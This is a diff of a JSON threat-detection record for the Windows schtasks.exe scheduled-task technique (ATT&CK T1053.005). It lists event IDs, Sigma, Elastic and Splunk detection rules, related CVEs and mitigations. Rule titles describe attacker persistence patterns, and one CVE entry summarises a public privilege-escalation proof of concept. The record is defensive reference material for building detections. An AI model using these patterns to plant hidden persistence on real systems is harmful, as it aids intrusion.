+        "techniques": "T1053.005, T1036.004"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 11,
+        "data_components": "File Creation",
+        "techniques": "T1053.005"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 13,
+        "data_components": "Windows Registry Key Modification",
+        "techniques": "T1053.005"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 14,
+        "data_components": "Windows Registry Key Modification",
+        "techniques": "T1053.005"
+      },
+      {
+        "log": "WinEventLog:System",
+        "event_id": 7045,
+        "data_components": "Service Creation",
+        "techniques": "T1036.004"
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "Potential KamiKakaBot Activity - Shutdown Schedule Task Creation",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2024/Malware/KamiKakaBot/proc_creation_win_malware_kamikakabot_schtasks_persistence.yml"
+      },
+      {
+        "title": "Scheduled Task Creation From Potential Suspicious Parent Location",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_schtasks_creation_from_susp_parent.yml"
+      },
+      {
+        "title": "HackTool - Default PowerSploit/Empire Scheduled Task Creation",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_hktl_powersploit_empire_default_schtasks.yml"
+      },
+      {
+        "title": "Renamed Schtasks Execution",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_renamed_schtasks_execution.yml"
+      },
+      {
+        "title": "Suspicious Schtasks Execution AppData Folder",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_appdata_local_system.yml"
+      },
+      {
+        "title": "Suspicious Modification Of Scheduled Tasks",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_change.yml"
+      },
+      {
+        "title": "Scheduled Task Creation Via Schtasks.EXE",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml"
+      },
+      {
+        "title": "Suspicious Scheduled Task Creation Involving Temp Folder",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_creation_temp_folder.yml"
+      },
+      {
+        "title": "Scheduled Task Creation with Curl and PowerShell Execution Combo",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_curl_and_powershell_combo.yml"
+      },
+      {
+        "title": "Delete Important Scheduled Task",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_delete.yml"
+      },
+      {
+        "title": "Delete All Scheduled Tasks",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_delete_all.yml"
+      },
+      {
+        "title": "Disable Important Scheduled Task",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_disable.yml"
+      },
+      {
+        "title": "Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_env_folder.yml"
+      },
+      {
+        "title": "Schtasks From Suspicious Folders",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_folder_combos.yml"
+      },
+      {
+        "title": "Suspicious Scheduled Task Name As GUID",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_guid_task_name.yml"
+      },
+      {
+        "title": "Uncommon One Time Only Scheduled Task At 00:00",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_one_time_only_midnight_task.yml"
+      },
+      {
+        "title": "Potential SSH Tunnel Persistence Install Using A Scheduled Task",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_openssh_tunnelling.yml"
+      },
+      {
+        "title": "Potential Persistence Via Microsoft Compatibility Appraiser",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_persistence_windows_telemetry.yml"
+      },
+      {
+        "title": "Scheduled Task Executing Payload from Registry",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml"
+      },
+      {
+        "title": "Scheduled Task Executing Encoded Payload from Registry",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader_encoded.yml"
+      },
+      {
+        "title": "Suspicious Schtasks Schedule Types",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_schedule_type.yml"
+      },
+      {
+        "title": "Suspicious Schtasks Schedule Type With High Privileges",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_schedule_type_system.yml"
+      },
+      {
+        "title": "Suspicious Scheduled Task Creation via Masqueraded XML File",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_schedule_via_masqueraded_xml_file.yml"
+      },
+      {
+        "title": "Suspicious Command Patterns In Scheduled Task Creation",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_susp_pattern.yml"
+      },
+      {
+        "title": "Schtasks Creation Or Modification With SYSTEM Privileges",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_system.yml"
+      },
+      {
+        "title": "Scheduled Task Creation Masquerading as System Processes",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_system_process.yml"
+      }
+    ],
+    "related_sigma_rules": 33,
+    "other_rules": [
+      "https://raw.githubusercontent.com/elastic/detection-rules/main/rules/windows/persistence_local_scheduled_task_scripting.toml",
+      "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/schtasks_scheduling_job_on_remote_system.yml"
+    ]
+  },
+  "related_CVE": [
     {
-      "eventsid": [
-        {
-          "sysmon": [
-            "T1053.005:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1"
-          ],
-          "windows": [
-            "T1053.005:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688",
-            "T1053.005:script:script_execution:log_channel:Microsoft-Windows-PowerShell/Operational:log_provider:Microsoft-Windows-PowerShell:4103"
-          ]
-        }
-      ],
-      "sigma_rules": [
-        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_schtasks_schedule_type.yml",
-        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_schtasks_schedule_type_system.yml"
-      ],
-      "other_rules": [
-        "https://raw.githubusercontent.com/elastic/detection-rules/main/rules/windows/persistence_local_scheduled_task_scripting.toml",
-        "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/schtasks_scheduling_job_on_remote_system.yml"
-      ]
+      "id": "CVE-2019-1069",
+      "description": "Windows Task Scheduler elevation of privilege. The public proof of concept runs a legacy Windows XP schtasks.exe (/change /TN bear /RU /RP) against a hard-linked task file to take over a protected file; this is a public exploit, not a documented intrusion.",
+      "references": "https://www.thezdi.com/blog/2019/6/11/exploiting-the-windows-task-scheduler-through-cve-2019-1069 https://0patch.com/blog/another-task-scheduler-0day-another"
+    },
+    {
+      "id": "CVE-2020-1472",
+      "description": "Netlogon (MS-NRPC) elevation of privilege, known as Zerologon. In a Qbot intrusion where the actors exploited it to get domain admin, Qbot used schtasks.exe to create a task that ran every 30 minutes for persistence.",
+      "references": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
     }
   ],
-  "related_CVE": [
-    "CVE-2019-1069",
-    "CVE-2020-0688",
-    "CVE-2020-1472"
-  ],
   "mitigations": [
-    "Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. (Citation: TechNet Scheduling Priority)",
-    "Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl. The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. (Citation: TechNet Server Operator Scheduled Task)",
-    "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. ",
-    "Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. (Citation: Powersploit)"
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "technique": "T1053.005"
+    },
+    {
+      "id": "M1028",
+      "name": "Operating System Configuration",
+      "technique": "T1053.005"
+    },
+    {
+      "id": "M1018",
+      "name": "User Account Management",
+      "technique": "T1053.005"
+    },
+    {
+      "id": "M1047",
+      "name": "Audit",
+      "technique": "T1053.005"
+    }
   ],
+  "additional_mitigations": [],
   "references": [
     "https://attack.mitre.org/techniques/T1053/005/",
     "https://app.tidalcyber.com/technique/723c6d51-91db-4658-9ee0-eafb953c2d82",
     "https://strontic.github.io/xcyclopedia/library/schtasks.exe-003D681048A63B9862C299F30492CFDF.html"
-  ]
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
 }
